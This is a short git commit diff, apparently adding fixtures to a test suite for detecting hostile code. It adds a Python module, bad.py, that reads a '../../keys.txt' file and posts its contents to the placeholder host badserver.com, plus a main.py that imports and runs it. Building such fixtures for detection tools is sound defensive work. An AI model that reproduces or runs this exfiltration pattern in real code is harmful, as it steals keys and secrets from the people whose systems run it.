e8ae4853d1016e8b6d60ef55d8ac761a6e698254
Neeyanth Kopparapu <nkopparapu@college.harvard.edu>
2024-04-29 14:56:45 -0400

    added some tests

---
+++ bad_dir_tests/test2/imports/bad.py
@@ -0,0 +1,15 @@
+import requests
+
+def main():
+    with open('../../keys.txt', 'r') as file:
+        file_contents = file.read()
+    url = 'http://badserver.com/files'
+    payload = {'file_contents': file_contents}
+    response = requests.post(url, data=payload)
+    if response.status_code == 200:
+        print('POST request successful')
+    else:
+        print('POST request failed')
+
+if __name__ == '__main__':
+    main()
---
+++ bad_dir_tests/test2/main.py
@@ -0,0 +1,3 @@
+from imports import bad
+
+bad.main()
